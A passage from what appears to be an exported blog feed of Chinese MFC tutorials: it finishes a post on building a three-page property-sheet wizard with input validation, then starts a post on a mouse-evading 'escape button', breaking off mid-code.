class=""><p>这个里面应是得有几个公司的名字才对，由于这个类是我们新建的，还没有初始化的地方。<br>所以要重写InitDialog</p><p>老样子类视图选中然后属性里面找到重写选项，往下滑找到<code>OnInitDialog</code>，点击后面add即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_01::OnInitDialog</span><span class="params">()</span></span>&#123;</span><br><span class="line">CPropertyPage::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加额外的初始化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// return TRUE unless you set the focus to a control</span></span><br><span class="line">  <span class="comment">// 异常: OCX 属性页应返回 FALSE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取控件最快的就是用指针。</p><p><code>CListBox* pListBox = (CListBox*)GetDlgItem(IDC_LIST_COMPANY);</code><br>因为这个控件是我们拖得，所以我们很清楚它是什么类型，但是别人不一定清楚。<br>而且GetDlgItem的返回类型是CWnd，但是好在CListBox是它的子类。所以直接强制转换一下。<br>获取完成后，就可以通过指针给他增加点字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_01::OnInitDialog</span><span class="params">()</span></span>&#123;</span><br><span class="line">CPropertyPage::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加额外的初始化</span></span><br><span class="line">CListBox* pListBox = (CListBox*)<span class="built_in">GetDlgItem</span>(IDC_LIST_COMPANY);</span><br><span class="line"><span class="keyword">if</span>( pListBox )&#123;</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;阿里巴巴&quot;</span>));</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;华为&quot;</span>));</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;腾讯&quot;</span>));</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;百度&quot;</span>));</span><br><span class="line">pListBox-&gt;<span class="built_in">AddString</span>(_T(<span class="string">&quot;京东&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;  <span class="comment">// return TRUE unless you set the focus to a control</span></span><br><span class="line">  <span class="comment">// 异常: OCX 属性页应返回 FALSE</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样这个对话框就ok了</p><hr><img src="/2022/08/03/nDialog/006.png" class=""><p>再次创建新的对话框，拖动check box组合一下</p><p>同样的给这个对话框创建一个类，步骤也是从类向导开始，注意命名规范。</p><p>最后就是复选框添加变量，跟radio差不多的路数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// 技能选项</span></span><br><span class="line">BOOL m_skill[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后在源文件同样通过memset写0，和后面的绑定</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PROP_02::<span class="built_in">PROP_02</span>()</span><br><span class="line">: <span class="built_in">CPropertyPage</span>(IDD_PROP_02)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(m_skill, <span class="number">0</span>, <span class="built_in">sizeof</span>(m_skill));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROP_02::~<span class="built_in">PROP_02</span>()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PROP_02::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPropertyPage::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CHECK1, m_skill[<span class="number">0</span>]);<span class="comment">//网络编程</span></span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CHECK2, m_skill[<span class="number">1</span>]);<span class="comment">//MFC</span></span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CHECK3, m_skill[<span class="number">2</span>]);<span class="comment">//操作系统</span></span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CHECK4, m_skill[<span class="number">3</span>]);<span class="comment">//数据结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这么一来这个对话框界面也就ok了。</p><p>可能稍微为了好看就要注意一下这几个对话框大小</p><img src="/2022/08/03/nDialog/007.png" class=""><p>选中这个dialog的时候vs的下面会显示，手动调整一下</p><hr><img src="/2022/08/03/nDialog/008.png" class=""><p>至于这个也不做多解释了，创建的路数都一样。</p><p>唯一需要注意的是这个下拉多选的控件是<code>combo box</code></p><img src="/2022/08/03/nDialog/009.png" class=""><p>数据使用分号分割，注意要英语符合。</p><hr><p>最后三个对话框都创建好了，自然需要关联起来。</p><img src="/2022/08/03/nDialog/010.png" class=""><p>对这个项目创建一个MFC类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CMyProSheet</span>(UINT nIDCaption, CWnd* pParentWnd = <span class="literal">nullptr</span>, UINT iSelectPage = <span class="number">0</span>);</span><br><span class="line"><span class="built_in">CMyProSheet</span>(LPCTSTR pszCaption, CWnd* pParentWnd = <span class="literal">nullptr</span>, UINT iSelectPage = <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这两个构造函数可以看到就头不一样，UINT也就是unsigned int，下面那个也就是字符串<br>不过既然有俩了，那有啥改动就尽量都保持一样</p><p>然后添加一下我们三个对话框类</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line">PROP_01 m_prop1;</span><br><span class="line">PROP_02 m_prop2;</span><br><span class="line">PROP_03 m_prop3;</span><br></pre></td></tr></table></figure><p>在源文件中构造的时候添加这三个页</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CMyProSheet::<span class="built_in">CMyProSheet</span>(UINT nIDCaption, CWnd* pParentWnd, UINT iSelectPage)</span><br><span class="line">:<span class="built_in">CPropertySheet</span>(nIDCaption, pParentWnd, iSelectPage)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop1);</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop2);</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CMyProSheet::<span class="built_in">CMyProSheet</span>(LPCTSTR pszCaption, CWnd* pParentWnd, UINT iSelectPage)</span><br><span class="line">:<span class="built_in">CPropertySheet</span>(pszCaption, pParentWnd, iSelectPage)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop1);</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop2);</span><br><span class="line"><span class="built_in">AddPage</span>(&amp;m_prop3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这几个页是组合到一起了。剩下就是写那个按钮事件了。</p><p>额尴尬，跑的时候有个问题，就是单选按钮没有组，然后抛出异常了</p><img src="/2022/08/03/nDialog/011.png" class=""><p>修改一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PROP_01::<span class="built_in">PROP_01</span>()</span><br><span class="line">: <span class="built_in">CPropertyPage</span>(IDD_PROP_01)</span><br><span class="line">, <span class="built_in">m_lang</span>(<span class="number">-1</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROP_01::~<span class="built_in">PROP_01</span>()&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PROP_01::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span>&#123;</span><br><span class="line">CPropertyPage::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RADIO_CPP, m_lang);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完之后跑起来就ok了</p><img src="/2022/08/03/nDialog/012.png" class=""><img src="/2022/08/03/nDialog/013.png" class=""><img src="/2022/08/03/nDialog/014.png" class=""><p>因为设置的大小差不多，比较和谐。</p><hr><p>稍微有心的可能会注意到，那个帮助不一定需要，按照前面重载按钮类的示例，这边也就能重写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_01::OnSetActive</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line"></span><br><span class="line">((CPropertySheet*)<span class="built_in">GetParent</span>())-&gt;<span class="built_in">SetWizardButtons</span>(PSWIZB_NEXT);</span><br><span class="line">((CPropertySheet*)<span class="built_in">GetParent</span>())-&gt;<span class="built_in">GetDlgItem</span>(IDHELP)-&gt;<span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnSetActive</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_02::OnSetActive</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line">((CPropertySheet*)<span class="built_in">GetParent</span>())-&gt;<span class="built_in">SetWizardButtons</span>(PSWIZB_NEXT | PSWIZB_BACK);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnSetActive</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_03::OnSetActive</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line">((CPropertySheet*)<span class="built_in">GetParent</span>())-&gt;<span class="built_in">SetWizardButtons</span>(PSWIZB_BACK | PSWIZB_FINISH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CPropertyPage::<span class="built_in">OnSetActive</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个对话框，只显示下一步，上一步无法点击，并且隐藏帮助按钮<br>第二个对话框则上下都可行<br>第三个对话框只能向上一步和完成。</p><img src="/2022/08/03/nDialog/015.png" class=""><img src="/2022/08/03/nDialog/016.png" class=""><img src="/2022/08/03/nDialog/017.png" class=""><hr><p>说到底还是个半成品，还有很多能优化的地方。<br>比如校验，目前这个即便不选择，也可以直接next。</p><p>所以要重写两个next，最后一个因为变成完成了，所以要重写的是finish</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">PROP_01::OnWizardNext</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"><span class="keyword">if</span>( m_lang == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择开发语言!&quot;</span>), _T(<span class="string">&quot;开发语言未选择&quot;</span>), MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_company.<span class="built_in">GetLength</span>() == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择公司!&quot;</span>), _T(<span class="string">&quot;公司未选择&quot;</span>), MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnWizardNext</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">PROP_02::OnWizardNext</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (m_skill[<span class="number">0</span>] + m_skill[<span class="number">1</span>] + m_skill[<span class="number">2</span>] + m_skill[<span class="number">3</span>]) == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择技能!&quot;</span>), _T(<span class="string">&quot;技能未选择&quot;</span>), MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnWizardNext</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PROP_03::OnWizardFinish</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_money.<span class="built_in">GetLength</span>() &lt;= <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择薪资!&quot;</span>), _T(<span class="string">&quot;薪资未选择&quot;</span>), MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CPropertyPage::<span class="built_in">OnWizardFinish</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>记得获取前肯定要更新一下数据</strong></p><p>这套流程结束了之后，还要给用户一个反馈。</p><p>也只能加载打开按钮的地方</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CRunningButtonDlg::OnBnClickedBtnQuery</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="function">CMyProSheet <span class="title">dlg</span><span class="params">(_T(<span class="string">&quot;职业调查&quot;</span>), <span class="keyword">this</span>)</span></span>;</span><br><span class="line">dlg.<span class="built_in">SetWizardMode</span>();</span><br><span class="line"><span class="keyword">if</span>( ID_WIZFINISH == dlg.<span class="built_in">DoModal</span>() )&#123;</span><br><span class="line">CString strMsg = _T(<span class="string">&quot;您的选择是: &quot;</span>);</span><br><span class="line"><span class="keyword">switch</span>( dlg.m_prop1.m_lang )&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">strMsg += _T(<span class="string">&quot;开发语言: C++&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">strMsg += _T(<span class="string">&quot;开发语言: Java&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">strMsg += _T(<span class="string">&quot;开发语言: Python&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strMsg += _T(<span class="string">&quot;您的公司是: &quot;</span>) + dlg.m_prop1.m_company;</span><br><span class="line">strMsg += _T(<span class="string">&quot;您的技能有：&quot;</span>);</span><br><span class="line">CString strSkill[<span class="number">4</span>] = &#123;</span><br><span class="line">_T(<span class="string">&quot;网络编程&quot;</span>), _T(<span class="string">&quot;MFC&quot;</span>), _T(<span class="string">&quot;操作系统&quot;</span>), _T(<span class="string">&quot;数据结构&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">if</span>( dlg.m_prop2.m_skill[i] )&#123;</span><br><span class="line">strMsg += strSkill[i] + _T(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strMsg += _T(<span class="string">&quot;您的薪资范围选择是：&quot;</span>) + dlg.m_prop3.m_money;</span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;最终选择&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/08/03/nDialog/018.png" class=""><p>选择完之后就是这样的显示。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><img src="/2022/08/03/nDialog/019.png" class=""><p>主体对话框是RunningButtonDlg，通过按钮控件，显示出CMyPropSheet。然后写好的三个页与其关联。</p>]]></content>
      
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>丐版逃跑按钮</title>
      <link href="/2022/08/02/escapeButton/"/>
      <url>/2022/08/02/escapeButton/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>就是窗口上有个按钮，然后鼠标过去按钮就移动。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>新建MFC项目<br>选中基于对话框<br>用户界面的东西基本用不到<br>高级功能打印也用不到<br>其它都正常创建</p><hr><blockquote><p>核心思想跟网上流传的网页版本可能有区别吧，这个原理就是两个按钮，当发现鼠标要触碰到这个按钮就隐藏这个，启用另一个。</p></blockquote><hr><p>首先就是拖俩button控件</p><img src="/2022/08/02/escapeButton/000.png" class=""><p>然后将左边的按钮属性中  可见 这一属性设为FALSE</p><img src="/2022/08/02/escapeButton/001.png" class=""><p>那么跑起来的效果就是这样的，看不到左边</p><img src="/2022/08/02/escapeButton/002.png" class=""><p>然后给这两个控件添加变量,[过程不做演示了，mfc用多了就习惯了]</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CButton m_btn_right;</span><br><span class="line">    CButton m_btn_left;</span><br></pre></td></tr></table></figure><p>对于对话框而言，能第一时间想到触碰按钮的消息，也就是跟鼠标移动有关的。<br>那么显然是有这么一个消息的<code>OnMouseMove</code></p><p>添加完之后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CRunningButtonDlg::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">CRect left, right;</span><br><span class="line">m_btn_right.<span class="built_in">GetWindowRect</span>(right);</span><br><span class="line"><span class="keyword">if</span>(right.<span class="built_in">PtInRect</span>(point) == TRUE)&#123;</span><br><span class="line">m_btn_right.<span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line">m_btn_left.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理也简单，就是当鼠标移动到这个控件上的时候，就隐藏right按钮，显示left按钮。</p><p>不过在实际run的时候会发现并没有起作用。<br>遇事不决可以添加调试的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CRunningButtonDlg::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">CRect left, right;</span><br><span class="line">m_btn_right.<span class="built_in">GetWindowRect</span>(right);</span><br><span class="line"><span class="keyword">if</span>(right.<span class="built_in">PtInRect</span>(point) == TRUE)&#123;</span><br><span class="line">m_btn_right.<span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line">m_btn_left.<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;%s(%d):%s %d %d\n&quot;</span>, __FILE__, __LINE__,</span><br><span class="line">__FUNCTION__, point.x, point.y);</span><br><span class="line"></span><br><span class="line">CDialogEx::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/08/02/escapeButton/003.png" class=""><p>可以看到只要鼠标是在这个对话框上移动，xy就会不断发生变化，但是当鼠标进入控件的时候，xy就不会输出了。</p><p>原因在于这个消息被按钮控件接收了，判断那里就没法用了，所以对话框无法知道这个鼠标到哪了<br>所以通过鼠标移动消息无法实现这个效果。</p><hr><p>解决方式需要重载这个按钮类。</p><p>右击资源视图的项目，选择类向导，在添加类的箭头点击选择MFC类，基类选择为CButton就行，其它的头文件和源文件命名方式看个人习惯吧。</p><p>新建完之后照例打开类视图选择这个新建的类，然后在属性中找到消息，继续选择<code>MouseMove</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyButton::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(SW_HIDE);</span><br><span class="line"><span class="keyword">if</span>(m_pButton != <span class="literal">NULL</span>)&#123;</span><br><span class="line">m_pButton-&gt;<span class="built_in">ShowWindow</span>(SW_SHOW);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CButton::<span class="built_in">OnMouseMove</span>(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改RunningButtonDlg.h</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;CMyButton.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CMyButton m_btn_right;</span><br><span class="line">    CMyButton m_btn_left;</span><br></pre></td></tr></table></figure><p>将这个按钮改为我们重载之后的按钮类型。</p><p>最后在RunningButtonDlg.cpp中初始化的地方关联这两个按钮</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CRunningButtonDlg::OnInitDialog</span><span class="params">()</span></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">OnInitDialog</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line"><span class="comment">//  执行此操作</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, TRUE);<span class="comment">// 设置大图标</span></span><br><span class="line"><span class="built_in">SetIcon</span>(m_hIcon, FALSE);<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 